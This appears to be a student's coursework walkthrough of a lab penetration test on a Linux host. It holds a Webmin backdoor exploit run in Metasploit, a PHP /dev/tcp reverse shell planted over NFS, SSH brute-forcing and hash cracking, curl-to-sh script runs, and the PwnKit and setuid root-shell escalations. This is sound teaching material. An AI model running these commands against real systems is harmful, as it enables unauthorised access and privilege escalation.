# CF Coursework 2

## Remote Enumeration

### Initial NMAP Scan of Whole Network
``` 
┌──(kali@kali-99-590)-[~]
└─$ sudo nmap 10.1.26.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 13:08 GMT
Nmap scan report for 10.1.26.1
Host is up (0.0019s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: FA:16:3E:54:7D:F0 (Unknown)

Nmap scan report for 10.1.26.2
Host is up (0.0020s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: FA:16:3E:B6:7A:98 (Unknown)

Nmap scan report for 10.1.26.3
Host is up (0.0020s latency).
All 1000 scanned ports on 10.1.26.3 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: FA:16:3E:DB:FA:60 (Unknown)

Nmap scan report for 10.1.26.4
Host is up (0.0019s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: FA:16:3E:90:8D:AD (Unknown)

Nmap scan report for 10.1.26.5
Host is up (0.0019s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: FA:16:3E:77:33:1D (Unknown)

Nmap scan report for 10.1.26.30
Host is up (0.0019s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
10000/tcp open  snet-sensor-mgmt
MAC Address: FA:16:3E:59:F5:C8 (Unknown)

Nmap scan report for kali-99-590 (10.1.26.20)
Host is up (0.0000060s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server

Nmap done: 256 IP addresses (7 hosts up) scanned in 2.54 seconds
```

- Nothing too interesting from 10.1.26.1 - 10.1.26.5
- 10.1.26.30 has some interesting ports open so we will do a more detailed scan of that machine

### Nmap Scan of 10.1.26.30
- -sC to run default scripts 
- -sV to enumerate versions

``` 
┌──(kali@kali-99-590)-[~]
└─$ sudo nmap -sC -sV 10.1.26.30                                                                                                                                                                             130 ⨯
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 13:19 GMT
Nmap scan report for 10.1.26.30
Host is up (0.00077s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ea0b9c1d0ffba6399a15c00e9747cb83 (RSA)
|   256 a4feb3d4863dde1b7c71fe833db89ace (ECDSA)
|_  256 c5198035f76360ad38ae75cc8fc41969 (ED25519)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34230/tcp   mountd
|   100005  1,2,3      34373/udp6  mountd
|   100005  1,2,3      42366/udp   mountd
|   100005  1,2,3      46250/tcp6  mountd
|   100021  1,3,4      42944/tcp   nlockmgr
|   100021  1,3,4      44892/tcp6  nlockmgr
|   100021  1,3,4      54835/udp6  nlockmgr
|   100021  1,3,4      58101/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl 2-3 (RPC #100227)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: FA:16:3E:59:F5:C8 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.86 seconds
```

- This shows some interesting things
- We have ssh running which could be brute forced if the password isn't strong enough
- Apache 2.4.18 which could possibly be exploited
- An nfs share we can mount to upload files to the server
- MiniServ 1.89 which can be exploited to get a shell

### Looking at the Apache Server
![[apache-default-page.png]]

- Nothing interesting on the index page so use feroxbuster to enumerate resources on the server

### Feroxbuster
- Search for html, php and txt files
```
┌──(kali㉿kali-99-590)-[~]
└─$ feroxbuster -u http://10.1.26.30 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt                                                                                           1 ⨯

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.26.30
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html, php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      968w    11321c http://10.1.26.30/
200      GET      375l      968w    11321c http://10.1.26.30/index.html
403      GET        9l       28w      275c http://10.1.26.30/.html
403      GET        9l       28w      275c http://10.1.26.30/.php
403      GET        9l       28w      275c http://10.1.26.30/server-status
[####################] - 1m    882184/882184  0s      found:5       errors:0
[####################] - 1m    882184/882184  7816/s  http://10.1.26.30/
```

- Nothing of interest was found - seems just like a default Apache server

## Initial Access

### Method 1 - Webmin
- From nmap we can see we have webmin 1.890 running on port 10000
- This version is vulnerable to a backdoor exploit that we can run using metasploit

```
Metasploit tip: Use the resource command to run
commands from a file
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search webmin 1.89

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor  2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_backdoor
```

- We can then setup the exploit with the options for the victim server and run the exploit


```
msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.1.26.30
RHOSTS => 10.1.26.30
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.1.26.20
LHOST => 10.1.26.20
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.1.26.20:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000
```

- This gives us a shell on the server, granted not the best shell in the world

```
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000

ls
JSON
LICENCE
LICENCE.ja
README
WebminCore.pm
WebminUI
```

#### Upgrading the shell

- To make this shell more usable we can utilise the metsploit feature meterperter shell

```
^Z
Background session 2? [y/N]  y
msf6 exploit(linux/http/webmin_backdoor) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(linux/http/webmin_backdoor) > use 0
```

```
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
  2         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.1.26.20:4433
[*] Sending stage (1017704 bytes) to 10.1.26.30
[*] Meterpreter session 3 opened (10.1.26.20:4433 -> 10.1.26.30:51376) at 2023-03-06 13:58:30 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
```

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information            Connection
  --  ----  ----                   -----------            ----------
  1         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
  2         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)
  3         meterpreter x86/linux  root @ 192.168.130.34  10.1.26.20:4433 -> 10.1.26.30:51376 (10.1.26.30)

msf6 post(multi/manage/shell_to_meterpreter) > sessions 3
[*] Starting interaction with 3...

meterpreter >
```

- We now have a meterpreter shell!
- Running sysinfo shows us we have a Ubuntu 16.04 box running with an old linux kernel - this could open some doors for a kernel exploit priv esc
- Also note we arent on amd64 we are on i686 which is 32bit - this could pose a problem for compiling some of our exploits

```
meterpreter > sysinfo
Computer     : 192.168.130.34
OS           : Ubuntu 16.04 (Linux 4.4.0-210-generic)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```

- we can upgrade our shell further by using the python pty library
- and export TERM=xterm will give you the ability to clear the screen
```
meterpreter > shell
Process 32222 created.
Channel 2 created.
python -c 'import pty; pty.spawn("/bin/bash")'
root@srv-99-590:/usr/share/webmin#
```

- This webmin exploit also allows us to log directly in as root

### Method 2 - NFS

- We can mount the nfs share and acces the files on the webserver

```
┌──(kali㉿kali-99-590)-[~]
└─$ sudo mount -t nfs 10.1.26.30:/ /mnt/nfs -o nolock 
┌──(kali㉿kali-99-590)-[~]
└─$ tree /mnt/nfs
/mnt/nfs
└── var
    └── www
        └── html
            └── index.html
```

- We can then upload a php reverse shell to the webserver into /var/www/html

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.1.26.20/1234 0>&1'");
?>
```

- Set up listener on attacker machine
```
┌──(kali㉿kali-99-590)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
```

- Run the reverse shell by going to http://10.1.26.30:80/rev.php

```
┌──(kali㉿kali-99-590)-[~]
└─$ nc -nvlp 9999
listening on [any] 9999 ...
connect to [10.1.26.20] from (UNKNOWN) [10.1.26.30] 49160
bash: cannot set terminal process group (9061): Inappropriate ioctl for device
bash: no job control in this shell
www-data@srv-99-590:~/html$ whoami
whoami
www-data
www-data@srv-99-590:~/html$
```

- Now we have a shell as the www-data user

### Method 3 - Brute Force SSH
- We can use hydra to brute force ssh on the server

```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ hydra -L namelist.txt -P /usr/share/wordlists/fasttrack.txt  10.1.26.30 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-06 16:40:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7548 login tries (l:34/p:222), ~472 tries per task
[DATA] attacking ssh://10.1.26.30:22/
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 7383 to do in 00:45h, 15 active
[22][ssh] host: 10.1.26.30   login: jennifer   password: 123456
[STATUS] 140.67 tries/min, 422 tries in 00:03h, 7127 to do in 00:51h, 15 active
[22][ssh] host: 10.1.26.30   login: root   password: dragon
^C^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

- From this we see we have 2 main users 
	- jennifer: 123456
	- root: dragon
- We can now login as either root or jennifer 


## Local Enumeration 

### Linpeas
- An easy way to check for some easily exploitable features is running the linpeas script
``` bash
curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.sh | sh
```

- Linpeas tells us that the machine is vulnerable to CVE-2021-4043 or PwnKit - a polkit exploit
- It also says its potentially vulnerable to CVE-2022-2588
- We also get the root shadow file which we can crack with john


## Priv Esc

### Method 1
- Crack root password using john
- We have to combine the /etc/passwd entry for root and /etc/shadow entry for root 

```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ unshadow passwd.txt shadow.txt > unshadowed.txt
Created directory: /home/kali/.john
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ cat unshadowed.txt
root:$5$BN8CmDdqe6QVOQkm$tuYdx49auWDZW3JZzsN9GKgriNTSAlSc/Js723Zvvv8:0:0:root:/root:/bin/bash
```

- Run john to crack root the password 
```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt unshadowed.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (root)
1g 0:00:00:00 DONE (2023-03-06 15:52) 8.333g/s 1850p/s 1850c/s 1850C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- We can now login as root

### Method 2 - PwnKit (CVE-2021-4034)

- Run john to crack jennifers password
- We need to login as jennifer as www-data cant compile a binary
```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt jenunshadow.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (jennifer)
1g 0:00:00:00 DONE (2023-03-06 16:38) 10.00g/s 2220p/s 2220c/s 2220C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- And this shows jennifer's password is **123456**

- Once we have logged in as jennifer we can download the polkit exploit and compile it
```
jennifer@srv-99-590:~$ curl https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > ex.c
<tent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > pwnkit.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1267  100  1267    0     0   3218      0 --:--:-- --:--:-- --:--:--  3223
jennifer@srv-99-590:~$ ls
ls
ex.c
jennifer@srv-99-590:~$ gcc ex.c -o ex
```

- Finally we can run the exploit to get root 
```
jennifer@srv-99-590:~$ ./ex
./ex
# whoami
whoami
root
#
```

### Method 3 - setuid Binary

- As we have access to the nfs share we are able to add the suid bit to any binary we want
- below is the source code that will spawn a root shell
``` c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

- We can then compile the code and move it to /var/www/html so we can access it on the attacker machine
- Finally we set the suid bit of the binary and change the owner to root so it always runs as root

```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ sudo chown root /mnt/nfs/var/www/html/shell                                                     
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ sudo chgrp root /mnt/nfs/var/www/html/shell
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ sudo chmod u+s /mnt/nfs/var/www/html/shell

jennifer@srv-99-590:/var/www/html$ ls -l
total 40
-rw-r--r-- 1 www-data www-data  1267 Mar  6 15:43 cve-2021-4034-poc.c
-rw-r--r-- 1 ubuntu   ubuntu    5489 Mar  6 15:14 exp.php
-rw-r--r-- 1 root     root     11321 Mar  5 00:49 index.html
-rw-r--r-- 1 www-data www-data     0 Mar  6 15:43 pwnkit.c
-rw-r--r-- 1 ubuntu   ubuntu      74 Mar  6 15:11 rev.php
-rwsrwxr-x 1 root     root      7388 Mar  6 17:11 shell
-rw-rw-r-- 1 jennifer jennifer   124 Mar  6 17:11 shell.c
```

- Run the binary on the target machine and you will get a root shell
```
jennifer@srv-99-590:/var/www/html$ ./shell
root@srv-99-590:/var/www/html# whoami
root
root@srv-99-590:/var/www/html#
```


### Method 4  - CVE-2022-2588 (FAILED CRASHED BOX)
- I tried to exploit this cve however it failed as shown below

```
jennifer@srv-99-590:~$ curl https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential.c > ex2.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 23935  100 23935    0     0  81581      0 --:--:-- --:--:-- --:--:-- 81411
jennifer@srv-99-590:~$ man gcc
jennifer@srv-99-590:~$ gcc -O0 ex2.c -lpthread -o ex2
jennifer@srv-99-590:~$ ./ex2
self path /home/jennifer/./ex2
prepare done
Old limits -> soft limit= 14096 	 hard limit= 14096
starting exploit, num of cores: 1
defrag done
spray 256 done
freed the filter object
256 freed done
double free done
spraying files
no overlap found :(...
failed
```


